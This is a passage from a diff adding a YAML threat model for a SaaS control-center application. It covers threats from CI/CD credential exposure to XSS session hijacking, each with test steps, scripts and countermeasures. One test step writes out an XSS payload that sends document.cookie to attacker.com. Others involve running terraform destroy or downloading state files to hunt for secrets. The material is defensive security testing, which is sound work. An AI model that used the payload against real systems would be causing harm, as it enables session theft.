+      - SO-AVAIL
+      - SO-INT
+      - SO-CONF
+    attackers:
+      - ATT_SUPPLY_CHAIN
+      - ATT_INSIDER
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      score: 8.5
+      severity: "High"
+    fullyMitigated: false
+    alwaysPresent: false
+
+    testPrerequisites:
+      - "Access to the CI/CD pipeline configuration (e.g., GitHub Actions, Azure DevOps)"
+      - "Ability to read pipeline secret variables or environment variable definitions"
+      - "Knowledge of the Terraform state file location (local, Azure Storage, Terraform Cloud)"
+
+    testSteps:
+      - "Inspect CI/CD pipeline YAML definitions for hardcoded credentials or service principal secrets"
+      - "Check whether the Terraform state file is accessible via a public or weakly-authorized storage URL"
+      - "Download the Terraform state file (if accessible) and search for sensitive_values or plaintext secrets"
+      - "Verify the Azure service principal used by Terraform is scoped to the minimum required permissions — not Contributor or Owner"
+      - "Attempt to execute 'terraform destroy' using only the pipeline credentials without CC approval workflow"
+      - "Verify that no Terraform operation can be triggered outside the CC-approved workflow"
+      - "Confirm the CI/CD pipeline requires approval gates before applying destructive Terraform plans"
+
+    testScripts:
+      - language: "bash"
+        description: "Scan Terraform state file for exposed secrets or credentials"
+        code: |
+          #!/bin/bash
+          # Usage: ./scan_tfstate.sh <path_to_terraform.tfstate>
+          TFSTATE="$1"
+
+          echo "[*] Scanning Terraform state for exposed secrets..."
+          echo ""
+
+          echo "[*] Checking for client_secret patterns..."
+          grep -i "client_secret\|password\|api_key\|secret_key\|auth_token" "$TFSTATE" \
+            | grep -v '"value": ""' | grep -v '"value": null'
+
+          echo ""
+          echo "[*] Checking for sensitive values not marked as sensitive..."
+          python3 -c "
+          import json, sys
+          with open('$TFSTATE') as f:
+              state = json.load(f)
+          for res in state.get('resources', []):
+              for inst in res.get('instances', []):
+                  attrs = inst.get('attributes', {})
+                  for k, v in attrs.items():
+                      if isinstance(v, str) and len(v) > 20 and any(
+                          word in k.lower() for word in ['secret','password','key','token','credential']
+                      ):
+                          print(f'[WARNING] {res[\"type\"]}.{res[\"name\"]}.{k} = {v[:20]}...')
+          "
+        requirements:
+          - "python3"
+
+    testTools:
+      - "truffleHog (secret scanning in git history and CI configs)"
+      - "detect-secrets (pre-commit secret scanner)"
+      - "Azure CLI (verify service principal permission scope: az role assignment list)"
+      - "Terraform (terraform show — inspect state contents)"
+
+    expectedBehavior: >
+      Service principal credentials are stored as plaintext CI/CD environment variables
+      accessible to any pipeline contributor. Terraform state is stored in a shared Azure
+      Storage account without access controls. Any pipeline run can execute Terraform destroy
+      without a human approval gate.
+
+    expectedMitigation: >
+      CI/CD pipeline uses OIDC Workload Identity Federation (no static credentials). Terraform state
+      is stored in a RBAC-protected Azure Storage account accessible only by the pipeline identity.
+      All Terraform applies and destroys require a manual pipeline approval gate tied to the
+      same two-person integrity model as the CC lifecycle workflow.
+
+    countermeasures:
+      - ID: CM_004_MANAGED_IDENTITY
+        title: "Replace Static Service Principal Credentials with OIDC Workload Identity Federation"
+        description: >
+          Configure the CI/CD pipeline to authenticate to Azure using OIDC Workload Identity
+          Federation (for GitHub Actions) — eliminating static service principal secrets
+          that can be exfiltrated.
+        status: "in_place"
+        effort: "Medium"
+        why: >
+          Static service principal secrets are the single most exfiltrable privileged credential
+          in the architecture. OIDC Workload Identity Federation removes the secret entirely —
+          there is nothing to steal, rotate, or accidentally commit to a repository.
+        implementation:
+          - "Configure GitHub Actions with Azure/login action using OIDC Workload Identity Federation — no client secret needed"
+          - "Remove all ARM_CLIENT_SECRET and service principal credential entries from pipeline secrets and variable groups"
+          - "Scope the federated identity role assignments to specific resource groups only — not subscription-level Contributor"
+          - "Verify: run 'az role assignment list --assignee <federated-identity-client-id>' and confirm no Owner or Contributor at subscription scope"
+
+      - ID: CM_004_TF_STATE_PROTECT
+        title: "Restrict Terraform State Backend to Pipeline Identity Access Only"
+        description: >
+          Store the Terraform state in an Azure Storage Account configured with RBAC-only
+          access (disable shared access key authentication) and grant only the pipeline
+          federated identity the Storage Blob Data Contributor role.
+        status: "in_place"
+        effort: "Low"
+        why: >
+          Terraform state files contain plaintext values of all provisioned resource
+          attributes including connection strings, WorkOS client secrets, and Key Vault
+          resource IDs. Unrestricted state access is effectively equivalent to infrastructure
+          credential exposure.
+        implementation:
+          - "Create a dedicated Azure Storage Account for Terraform state in the EU region"
+          - "Disable 'Allow storage account key access' — force all access through Azure AD authentication"
+          - "Grant only the pipeline federated identity 'Storage Blob Data Contributor' role on the state container"
+          - "Enable versioning on the storage container to preserve state history and enable rollback"
+          - "Enable Azure Storage diagnostic logging to capture all blob access operations"
+
+      - ID: CM_004_PIPELINE_GATE
+        title: "Add a Human Approval Gate to All Terraform Destroy Operations in the Pipeline"
+        description: >
+          Require an explicit human approval step in the CI/CD pipeline before any Terraform
+          destroy plan is applied, scoped to the same Verifier role as the CC application.
+        status: "not_started"
+        effort: "Medium"
+        why: >
+          A compromised pipeline could execute destroy operations automatically without the CC
+          workflow approval. A pipeline-level approval gate provides an independent layer of
+          destruction control that requires human authorization even if the CC application is
+          compromised.
+        implementation:
+          - "In Azure DevOps: configure an environment approval gate on the Terraform destroy stage requiring a designated approver"
+          - "In GitHub Actions: add 'environment: terraform-destroy' with required reviewers on the destroy job"
+          - "Approval must come from a different identity than the one who triggered the pipeline"
+          - "Log the approval event including pipeline run ID, approver identity, and timestamp to the immutable audit log"
+          - "Test: trigger a Terraform destroy pipeline run and verify it blocks at the approval gate"
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_005 — Rogue Tenant Provisioning: Unauthorized Client Environment Creation
+  # Stage: Tenant Creation Workflow
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_005_ROGUE_TENANT
+    title: "Unauthorized Rogue Tenant Provisioning for Infrastructure Abuse"
+    threatType: "Elevation of Privilege"
+    attack: >
+      An attacker or malicious insider who has compromised a CC-Initiator and CC-Verifier
+      account (or a single admin account holding both roles if two-person integrity is
+      misconfigured) submits and approves a new tenant creation request for a fictitious
+      organization. The resulting provisioned infrastructure (CosmosDB database shard, Key Vault key,
+      WorkOS organisation) is controlled by the attacker and used to access platform internals,
+      stage data exfiltration, or consume cloud resources for cryptomining or attack infrastructure.
+    impactDesc: >
+      Unauthorized cloud infrastructure provisioned under SignalCaptureAI's Azure subscription at
+      the attacker's direction. Cloud cost fraud. Platform security posture weakened by additional
+      unmonitored infrastructure. If the rogue tenant's WorkOS organisation is misconfigured, it
+      could issue tokens that the platform application mistakenly accepts.
+    impactedSecObj:
+      - SO-AUTH
+      - SO-INT
+      - SO-AVAIL
+    attackers:
+      - ATT_INSIDER
+      - ATT_COLLUDING_ADMINS
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:H/A:L"
+      score: 7.6
+      severity: "High"
+    fullyMitigated: false
+    alwaysPresent: false
+
+    testPrerequisites:
+      - "CC admin credentials (Initiator and Verifier accounts)"
+      - "Access to the Azure subscription to verify what is provisioned"
+
+    testSteps:
+      - "Submit a new tenant creation request with a fictitious company name and slug"
+      - "Approve the request from a second CC admin account (or test self-approval path)"
+      - "Verify the provisioning pipeline provisions real CosmosDB shards, Key Vault, and WorkOS organisations"
+      - "Confirm a welcome email is dispatched to a controlled email address"
+      - "Access the provisioned tenant environment using the welcome email URL"
+      - "Verify the audit log contains both the Initiator and Verifier identities for this provisioning event"
+      - "Check whether Azure Cost Management alerts are configured to detect unexpected resource creation"
+
+    testTools:
+      - "Azure Portal (confirm unauthorized resource provisioning in the subscription)"
+      - "Azure Cost Management (detect unexpected spending from rogue provisioning)"
+      - "WorkOS Dashboard (verify unauthorized tenant organisations are not listed)"
+
+    expectedBehavior: >
+      A single admin with both roles can submit and approve a rogue tenant request. No alert
+      fires when a new CosmosDB shard, Key Vault resource, or WorkOS organisation is provisioned
+      outside of a normal business-hours window.
+
+    expectedMitigation: >
+      Two-person integrity is enforced server-side so a single account cannot self-approve. All new
+      provisioning events trigger an Azure Cost Management alert and a separate security notification
+      to a non-CC distribution list. The tenant registry is reviewed weekly against the contracted
+      client list by a third party (e.g., finance team).
+
+    countermeasures:
+      - ID: CM_005_PROVISIONING_ALERT
+        title: "Send Provisioning Notifications to a Non-CC Distribution List for Out-of-Band Verification"
+        description: >
+          On every successful tenant provisioning, send a notification email containing the new
+          tenant's details (company name, slug, seat limit, Initiator and Verifier identities,
+          and timestamp) to a distribution list that includes finance or account management —
+          not solely CC administrators.
+        status: "not_started"
+        effort: "Low"
+        why: >
+          An out-of-band notification to a non-CC audience provides an independent signal that
+          a provisioning event occurred. A rogue provisioning event stands out against the
+          sales pipeline because there is no corresponding signed contract or commercial relationship.
+        implementation:
+          - "After successful provisioning pipeline completion, trigger a notification via the email-service to: cc-provisioning-notify@signalcaptureai.com (includes finance + founders)"
+          - "Include: tenant name, slug, seat limit, lead limit, Initiator identity, Verifier identity, provisioning timestamp"
+          - "Include: link to the tenant registry entry in the CC dashboard for immediate review"
+          - "Instruct the recipients: if this provisioning was not expected, escalate to the security team immediately"
+
+      - ID: CM_005_COST_ALERT
+        title: "Configure Azure Cost Management Alerts for Unexpected Resource Creation"
+        description: >
+          Set Azure Cost Management budget alerts and resource creation alerts to detect
+          unexpected SQL database or Key Vault provisioning events in the subscription.
+        status: "not_started"
+        effort: "Low"
+        why: >
+          Rogue provisioning consumes real Azure spend. A cost anomaly alert provides a
+          detection signal within hours of the event, independent of the CC audit log.
+        implementation:
+          - "Create an Azure Cost Management budget alert set at 110% of the expected monthly baseline"
+          - "Configure Azure Activity Log alerts for resource creation events of type 'Microsoft.DocumentDB/databaseAccounts/write' and 'Microsoft.KeyVault/vaults/write'"
+          - "Route alerts to the security team email and a Slack security channel"
+          - "Review the alert history monthly to tune thresholds as the tenant base grows"
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_006 — Emergency Hard-Delete Abuse: Data Destruction Without Justification
+  # Stage: Tenant Deletion — Emergency Path
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_006_HARD_DELETE_ABUSE
+    title: "Abuse of Emergency Hard-Delete Path to Destroy Tenant Data Without Justification"
+    threatType: "Tampering"
+    attack: >
+      The emergency hard-delete path bypasses the 30-day soft-delete retention period and
+      immediately purges all tenant data — an irreversible action. If the CC application
+      validates the emergency flag purely through a UI checkbox or a single boolean parameter
+      in the API request body — without requiring both Initiator and Verifier to independently
+      submit written justification through separate authenticated sessions — a malicious admin
+      can trigger immediate data destruction by simply toggling the flag.
+    impactDesc: >
+      Complete and irreversible destruction of a client tenant's data outside of a legitimate
+      legal or breach scenario. TDE key invalidation makes the data irrecoverable. GDPR data
+      erasure obligations are violated if the destruction is premature. Contractual liability.
+      Reputational damage severe enough to threaten the business.
+    impactedSecObj:
+      - SO-COMPLIANCE
+      - SO-INT
+      - SO-AUDIT
+    attackers:
+      - ATT_INSIDER
+      - ATT_COLLUDING_ADMINS
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:N/I:H/A:H"
+      score: 8.0
+      severity: "High"
+    fullyMitigated: false
+    alwaysPresent: false
+
+    testPrerequisites:
+      - "A CC admin account with CC-Initiator and CC-Verifier roles (or separate accounts for each)"
+      - "A pending or active tenant deletion request"
+      - "API access to the deletion approval and hard-delete trigger endpoints"
+
+    testSteps:
+      - "Submit a tenant deletion request as Initiator and gain Verifier approval"
+      - "In the standard flow, confirm the 30-day soft-delete timer is started and no immediate destruction occurs"
+      - "Attempt to set the emergency_hard_delete flag in the deletion request payload directly via API"
+      - "Verify the application requires a separate, independently authenticated written justification from the Verifier"
+      - "Attempt to skip the Verifier's written justification step by sending the request with the emergency flag but without the justification payload"
+      - "Confirm the pipeline does not execute a hard-delete until both justification records are present in the audit log"
+      - "Verify the audit log records both the Initiator and Verifier emergency confirmation events separately"
+
+    testTools:
+      - "Burp Suite (intercept and modify deletion request to inject emergency flag)"
+      - "Postman (craft minimal deletion API payload with emergency flag, without justification)"
+
+    expectedBehavior: >
+      The emergency flag is processed as a boolean parameter in the deletion API request.
+      Setting it to true triggers immediate data destruction without requiring an independently
+      authenticated justification from the Verifier. The flag can be injected by any admin
+      with access to the deletion endpoint.
+
+    expectedMitigation: >
+      Emergency hard-delete requires two separate, independently authenticated API calls from
+      distinct admin accounts — one Initiator confirmation and one Verifier confirmation —
+      each containing a non-empty written justification string. The pipeline does not execute
+      the hard-delete unless both records exist in the audit log. A 15-minute delay is enforced
+      between the second confirmation and pipeline execution as an additional abort window.
+
+    countermeasures:
+      - ID: CM_006_DUAL_CONFIRM
+        title: "Require Two Independent Authenticated Justification Submissions for Emergency Hard-Delete"
+        description: >
+          Implement emergency hard-delete as a two-step process: the Initiator submits a
+          written justification via an authenticated API call, and the Verifier independently
+          submits their own confirmation via a separate authenticated API call. The pipeline
+          does not execute until both records exist.
+        status: "not_started"
+        effort: "Medium"
+        why: >
+          A boolean flag in a single request is trivially bypassed. Requiring two independent
+          authenticated submissions creates a non-repudiable record and ensures the highest-risk
+          action in the system has the strongest authorization bar.
+        implementation:
+          - "Create a new API endpoint: POST /api/emergency-hard-delete/initiate (Initiator only) — accepts written_justification string (min 50 chars)"
+          - "Create a second endpoint: POST /api/emergency-hard-delete/confirm (Verifier only) — accepts written_justification string and the initiation record ID"
+          - "Block the Initiator from calling the confirm endpoint (same sub-claim rejection as T_002)"
+          - "Write both justification submissions as separate audit log entries before any pipeline action"
+          - "Add a 15-minute delay between the second confirmation and pipeline execution — log a 'pending execution' entry to allow abort"
+          - "Expose an abort endpoint: POST /api/emergency-hard-delete/abort (any CC admin) — cancels pending execution within the 15-minute window"
+
+      - ID: CM_006_SOFTDELETE_BACKUP
+        title: "Maintain an Offline Soft-Delete Backup Before Any Hard-Delete Execution"
+        description: >
+          Before executing any hard-delete (standard or emergency), automatically create a
+          compressed, encrypted backup of the tenant database to cold Azure Blob storage
+          as a final recovery option for erroneous destruction events.
+        status: "not_started"
+        effort: "Medium"
+        why: >
+          Even with strong authorization controls, operator error is possible. A final
+          encrypted backup before destruction provides a last-resort recovery path without
+          compromising the intended irreversibility of the hard-delete for authorized cases.
+        implementation:
+          - "Add a pipeline step before hard-delete execution: export tenant SQL database to a compressed .bacpac file"
+          - "Encrypt the .bacpac with a one-time key stored in Key Vault under a separate 'deletion-escrow' access policy"
+          - "Store the encrypted backup in Azure Blob cold tier under a 90-day lifecycle management policy"
+          - "Record the backup blob URI and encryption key reference in the immutable audit log deletion receipt"
+          - "After 90 days, the lifecycle policy automatically purges the backup — this is the true point of no return"
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_007 — Welcome Email Interception: Tenant Admin Link Hijacking
+  # Stage: Post-Provisioning Welcome Email Dispatch
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_007_EMAIL_HIJACK
+    title: "Welcome Email Interception Enabling Unauthorized First-Admin Registration"
+    threatType: "Spoofing"
+    attack: >
+      The welcome email dispatched to the tenant primary contact contains the tenant login URL
+      and a notice that the first user to register at that URL is automatically designated as
+      the Tenant Admin. If an attacker intercepts or guesses the welcome email before the
+      legitimate primary contact acts on it — via a compromised email account, a misconfigured
+      email provider, or knowledge of the tenant slug — they can register first and claim
+      admin privileges over the tenant environment, locking out the legitimate client.
+    impactDesc: >
+      Attacker gains Tenant Admin access to the newly provisioned environment. Can add their
+      own users, access any pre-loaded documentation, and deny access to the legitimate client.
+      Requires a complete SignalCaptureAI-initiated tenant deletion and re-provisioning to remediate.
+      Client trust severely damaged. Potential data exposure if the client uploads sensitive
+      product documentation before detecting the compromise.
+    impactedSecObj:
+      - SO-AUTH
+      - SO-CONF
+    attackers:
+      - ATT_EXTERNAL
+      - ATT_PHISHING
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:L"
+      score: 7.1
+      severity: "High"
+    fullyMitigated: false
+    alwaysPresent: false
+
+    testPrerequisites:
+      - "A freshly provisioned test tenant"
+      - "The welcome email sent to a controlled test email address"
+      - "Knowledge of the tenant slug (guessable if company names are predictable)"
+
+    testSteps:
+      - "Provision a test tenant and capture the welcome email"
+      - "Before the primary contact registers, attempt to access the tenant login URL directly: https://[slug].signalcaptureai.com"
+      - "Attempt to register a new account at the URL — verify whether the first registration is indeed granted admin"
+      - "Attempt to guess the tenant slug for several hypothetical company names and check whether those URLs resolve"
+      - "Verify whether the welcome email link includes any time-limited token or one-time-use registration key"
+      - "Check whether the WorkOS tenant organisation restricts registration to the primary contact email domain"
+      - "Verify the CC application provides a mechanism to lock the first-admin registration to the verified primary contact email address"
+
+    testTools:
+      - "Browser (direct URL registration test)"
+      - "Burp Suite (intercept registration POST to observe any admin elevation logic)"
+
+    expectedBehavior: >
+      Any user who reaches the tenant login URL before the primary contact can register and
+      receive Tenant Admin privileges. The URL is accessible to anyone who knows the tenant slug,
+      which may be guessable from the company name. The welcome email contains no time-limited token.
+
+    expectedMitigation: >
+      The first-admin registration is locked to the specific email address provided as the primary
+      contact at request time. Any registration attempt from a different email address during the
+      first-admin window is rejected. Alternatively, a time-limited (24-hour) signed registration
+      link is sent in the welcome email rather than a static URL.
+
+    countermeasures:
+      - ID: CM_007_FIRST_ADMIN_LOCK
+        title: "Lock First-Admin Registration to the Verified Primary Contact Email Address"
+        description: >
+          The platform stores the primary contact email from the provisioning request and restricts
+          the first-admin registration event to that specific email address. Any other email address
+          attempting to register first receives a standard user registration flow without admin elevation.
+        status: "in_place"
+        effort: "Medium"
+        why: >
+          The first-registration-as-admin model is operationally clean but creates a race condition.
+          Locking it to the verified email eliminates the race without requiring out-of-band credential
+          distribution, maintaining the model's simplicity while closing the takeover window.
+        implementation:
+          - "Store primary_contact_email in the tenant provisioning record in the platform database"
+          - "On first registration at the tenant URL: check if any admin account exists for this tenant"
+          - "If no admin exists: compare the registering user's email against primary_contact_email"
+          - "If match: grant CC-TenantAdmin role and send an admin welcome confirmation email"
+          - "If no match: complete registration as a standard Member role — emit a security alert that a non-primary contact registered first"
+          - "After first admin is registered: remove the first-admin lock restriction for subsequent registrations"
+
+      - ID: CM_007_SIGNED_LINK
+        title: "Replace Static Tenant URL in Welcome Email with a Time-Limited Signed Registration Link"
+        description: >
+          Generate a cryptographically signed, time-limited (24-hour) registration link for the
+          welcome email that is bound to the primary contact email address and expires after first use.
+        status: "in_place"
+        effort: "Medium"
+        why: >
+          A static URL is permanently guessable. A signed, time-limited link provides a window
+          of legitimacy and binds the registration event to the specific invitation, preventing
+          any third party from using the link after it has been claimed or expired.
+        implementation:
+          - "Generate a HMAC-signed token: sign(tenant_slug + primary_contact_email + expiry_timestamp) with a server-side secret"
+          - "Embed the token in the welcome email URL: https://[slug].signalcaptureai.com/register?token=<signed_token>"
+          - "On registration: validate the token signature, check expiry, and confirm the registering email matches the token payload"
+          - "Invalidate the token after first successful registration (single use)"
+          - "If the token expires before registration: provide a CC-triggered re-invitation flow rather than a permanent static URL"
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_008 — Repudiation: Admin Action Deniability via Weak Audit Attribution
+  # Stage: All CC Lifecycle Actions
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_008_REPUDIATION
+    title: "Admin Action Repudiation Due to Weak Audit Attribution"
+    threatType: "Repudiation"
+    attack: >
+      A CC administrator who performed an unauthorized or erroneous lifecycle action (deletion,
+      limit modification) claims they did not perform it, arguing that their account was
+      compromised or that the audit log is unreliable. If the audit log entries record only
+      the admin's email address (which can be renamed or reassigned) rather than the immutable
+      WorkOS subject (sub) claim, a renamed or recycled account creates ambiguity. Alternatively,
+      if the audit log is not cryptographically signed, an insider with storage access could
+      argue the log was tampered with.
+    impactDesc: >
+      Inability to attribute unauthorized lifecycle actions to a specific individual in a
+      regulatory investigation or internal review. Non-repudiation requirements under GDPR
+      Article 5(2) accountability cannot be demonstrated. Legal and compliance exposure.
+    impactedSecObj:
+      - SO-AUDIT
+      - SO-COMPLIANCE
+    attackers:
+      - ATT_INSIDER
+      - ATT_COLLUDING_ADMINS
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N"
+      score: 2.7
+      severity: "Low"
+    fullyMitigated: false
+    alwaysPresent: true
+
+    testPrerequisites:
+      - "Access to the audit log viewer in the CC dashboard"
+      - "A known lifecycle action was performed by a specific admin account"
+
+    testSteps:
+      - "Perform a lifecycle action (e.g., tenant limit modification) as a named CC admin"
+      - "Retrieve the resulting audit log entry and verify it contains: WorkOS sub claim (immutable user ID), email address, IP address, action type, target tenant, timestamp (UTC), outcome"
+      - "Rename the WorkOS user account's email address and verify the audit log entry still references the original immutable sub claim"
+      - "Verify whether the audit log entries are individually cryptographically signed or have a chain hash"
+      - "Attempt to insert a synthetic log entry with a falsified sub claim — verify the WORM policy rejects it"
+
+    testTools:
+      - "WorkOS Dashboard (verify user identity attributes used in JWT sub claim)"
+      - "Azure Storage Explorer (verify audit blob naming and content structure)"
+
+    expectedBehavior: >
+      Audit log entries record only the admin's email address. Email addresses can be changed
+      in WorkOS, making historical attribution ambiguous. Log entries are not individually signed
+      or chained, so a dispute about log integrity cannot be conclusively resolved.
+
+    expectedMitigation: >
+      Every audit entry records the WorkOS subject (sub) claim — an immutable, non-reassignable
+      identifier — alongside the email address at the time of action. Audit blobs are stored in
+      WORM immutable storage, and deletion receipt blobs are individually signed with a platform
+      private key. The combination of immutable storage and HMAC-chained log entries satisfies
+      non-repudiation requirements.
+
+    countermeasures:
+      - ID: CM_008_SUB_CLAIM
+        title: "Record Immutable WorkOS Subject Claim in Every Audit Log Entry"
+        description: >
+          Ensure every audit log event includes the WorkOS sub claim (user ID) as the primary
+          identity field, in addition to the email address recorded at the time of the action.
+        status: "in_place"
+        effort: "Low"
+        why: >
+          Email addresses can be changed or recycled. The WorkOS sub claim is assigned at account
+          creation and never changes or is reused, providing a permanent, non-ambiguous identity
+          anchor for every audit record.
+        implementation:
+          - "Update the audit log event schema: add field actor_sub (from JWT sub claim), actor_email (from JWT email claim), actor_ip"
+          - "Verify the JWT middleware extracts the sub claim from WorkOS tokens and makes it available in the request context"
+          - "Apply the schema update to all CC action handlers that write audit events"
+          - "For deletion receipts: include both Initiator sub and Verifier sub in the signed deletion receipt blob"
+          - "Add a test: change the email address of a test admin account and verify that previously recorded audit entries remain correctly attributed via sub claim"
+
+      - ID: CM_008_SIGNED_RECEIPTS
+        title: "Cryptographically Sign Deletion Receipts with a Platform Private Key"
+        description: >
+          For tenant deletion events — the most legally significant audit records — generate
+          a cryptographically signed receipt using a platform private key stored in Key Vault.
+          The signature covers all material fields of the deletion event.
+        status: "not_started"
+        effort: "High"
+        why: >
+          A deletion receipt stored in WORM storage is tamper-resistant but not individually
+          verifiable without access to the storage layer. A cryptographic signature allows
+          the receipt to be independently verified by a third party (auditor, regulator) without
+          relying on the storage provider's word.
+        implementation:
+          - "Generate a platform signing key pair — store the private key in Azure Key Vault under a 'signing' access policy"
+          - "On deletion completion: construct a canonical JSON object containing all material fields (tenant_id, initiator_sub, verifier_sub, timestamps, action_type)"
+          - "Call Key Vault Sign operation with RS256 algorithm to produce a signature over the canonical JSON"
+          - "Store the signed receipt as a blob: { payload: <canonical JSON>, signature: <base64 signature>, key_id: <Key Vault key version> }"
+          - "Publish the platform's public key at a well-known URL for independent verification"
+          - "Document the receipt verification procedure for auditors"
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_009 — CC Application Session Hijacking
+  # Stage: Authenticated CC Session
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_009_SESSION_HIJACK
+    title: "CC Admin Session Hijacking via XSS or Token Exfiltration"
+    threatType: "Spoofing"
+    attack: >
+      If the Control Center web application is vulnerable to Cross-Site Scripting (XSS) — for
+      example, by rendering unsanitized content from user-controlled fields such as tenant names
+      or rejection reason comments in the approval queue — an attacker who can inject a payload
+      into one of these fields can steal the authenticated admin's session token when a Verifier
+      reviews the request. Alternatively, if the CC JWT is stored in localStorage rather than
+      an HttpOnly cookie, any JavaScript running in the page context can read and exfiltrate it.
+    impactDesc: >
+      Full session takeover of a CC admin account. Attacker inherits the victim's role (Initiator
+      or Verifier) and can perform any lifecycle action available to that role. If the victim is
+      a Verifier reviewing a pending deletion, the attacker can immediately approve the request
+      using the stolen session.
+    impactedSecObj:
+      - SO-AUTH
+      - SO-CONF
+      - SO-INT
+    attackers:
+      - ATT_INSIDER
+      - ATT_EXTERNAL
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N"
+      score: 7.5
+      severity: "High"
+    fullyMitigated: false
+    alwaysPresent: false
+
+    testPrerequisites:
+      - "A CC admin account with Initiator role"
+      - "Access to submit a tenant creation request with a controllable text field (company name, reason)"
+      - "A second CC admin account with Verifier role to trigger the XSS payload"
+
+    testSteps:
+      - "Submit a New Tenant Request with the company name set to: <img src=x onerror=\"fetch('https://attacker.com/?t='+document.cookie)\">"
+      - "Log in as the Verifier account and navigate to the Approval Queue"
+      - "Observe whether the JavaScript executes in the Verifier's browser (token exfiltration to attacker.com)"
+      - "Verify whether the CC JWT is stored in localStorage (accessible to JS) or in an HttpOnly cookie (not accessible)"
+      - "Check the application's Content Security Policy header: does it prevent inline scripts and external fetches?"
+      - "Attempt to inject a reflected XSS payload in query parameters on the CC dashboard URL"
+      - "Verify the application escapes all user-supplied content before rendering in the approval queue view"
+
+    testScripts:
+      - language: "bash"
+        description: "Check Content Security Policy header on CC application login and dashboard endpoints"
+        code: |
+          #!/bin/bash
+          CC_URL="$1"  # e.g., https://control-center.signalcaptureai.com
+
+          echo "[*] Checking security headers on $CC_URL"
+          echo ""
+          curl -sI "$CC_URL" | grep -iE "content-security-policy|x-frame-options|x-content-type|referrer-policy|permissions-policy"
+
+          echo ""
+          echo "[*] Checking cookie attributes on login page..."
+          curl -sc /dev/null -sI "$CC_URL/login" | grep -i "set-cookie"
+        requirements:
+          - "curl"
+
+    testTools:
+      - "Burp Suite Scanner (automated XSS detection in input fields)"
+      - "OWASP ZAP (passive and active XSS scanning)"
+      - "Browser DevTools (inspect localStorage and cookie attributes for JWT storage)"
+
+    expectedBehavior: >
+      User-supplied content in tenant names or reason fields is rendered as raw HTML in the
+      approval queue. The CC JWT is stored in localStorage. No Content Security Policy header
+      is present. An injected script can read and exfiltrate the JWT.
+
+    expectedMitigation: >
+      All user-supplied content is HTML-encoded before rendering. The CC JWT is stored in an
+      HttpOnly, Secure, SameSite=Strict cookie. A strict Content Security Policy blocks inline
+      scripts and restricts fetch/XMLHttpRequest to the CC application origin only.
+
+    countermeasures:
+      - ID: CM_009_OUTPUT_ENCODE
+        title: "HTML-Encode All User-Supplied Content Before Rendering in the CC Application"
+        description: >
+          Ensure every user-supplied string (company name, slug, reason, comment) is
+          HTML-entity-encoded before being rendered in any page template in the CC application.
+        status: "in_place"
+        effort: "Low"
+        why: >
+          XSS is fully preventable by consistent output encoding. A single unencoded field
+          in a high-privilege admin interface is sufficient for a complete session takeover.
+        implementation:
+          - "Audit all CC page templates and identify every location where user-supplied data is rendered"
+          - "Apply HTML entity encoding to every template variable: use the framework's built-in auto-escaping (e.g., Jinja2 autoscape=True, Razor @Html.Encode)"
+          - "Never use innerHTML, dangerouslySetInnerHTML, or equivalent direct HTML injection APIs"
+          - "Add a SAST rule to fail the CI build on any use of unescaped HTML output functions"
+
+      - ID: CM_009_HTTPONLY_COOKIE
+        title: "Store CC JWT in HttpOnly, Secure, SameSite=Strict Cookie"
+        description: >
+          Move CC session token storage from localStorage to an HttpOnly cookie, preventing
+          any JavaScript — including injected scripts — from reading the token.
+        status: "in_place"
+        effort: "Low"
+        why: >
+          localStorage is readable by any JavaScript running on the page. HttpOnly cookies
+          are invisible to JavaScript, making token exfiltration via XSS impossible even if
+          an injection vulnerability exists.
+        implementation:
+          - "Configure WorkOS session management to use HTTP-only cookie-based sessions"
+          - "Set the session cookie attributes: HttpOnly, Secure, SameSite=Strict, Path=/, Domain=control-center.signalcaptureai.com"
+          - "Set the cookie Max-Age to match the WorkOS session expiry (900 seconds)"
+          - "Verify in browser DevTools that the CC token does not appear in Application > Local Storage after login"
+          - "Verify in browser DevTools that the session cookie has HttpOnly flag set"
+
+      - ID: CM_009_CSP
+        title: "Implement a Strict Content Security Policy on the CC Application"
+        description: >
+          Deploy a Content Security Policy header that blocks inline script execution,
+          restricts script sources to the CC application origin, and blocks external fetches
+          to attacker-controlled domains.
+        status: "not_started"
+        effort: "Medium"
+        why: >
+          Even if an XSS payload is injected, a strict CSP prevents the injected script from
+          executing, rendering the injection harmless. CSP is a defense-in-depth layer that
+          catches encoding failures before they result in token exfiltration.
+        implementation:
+          - "Add header: Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self' https://api.workos.com; frame-ancestors 'none'"
+          - "Start in report-only mode (Content-Security-Policy-Report-Only) and collect violation reports for 1 week before enforcing"
+          - "Configure a CSP report URI to capture violations in Azure Monitor"
+          - "After enforcement: verify Burp Suite cannot inject a working XSS payload that exfiltrates data"
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_010 — Denial of Service: CC Application Availability Attack
+  # Stage: CC Admin Login / Application Layer
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_010_CC_DOS
+    title: "Denial of Service Against Control Center Blocking Tenant Operations"
+    threatType: "Denial of Service"
+    attack: >
+      An attacker floods the Control Center login endpoint or application layer with a high
+      volume of requests, exhausting Azure Container Apps connection limits or WorkOS rate limits.
+      Alternatively, a targeted account lockout attack against known CC admin email addresses
+      (derived from public LinkedIn or company website data) deliberately locks all CC admin
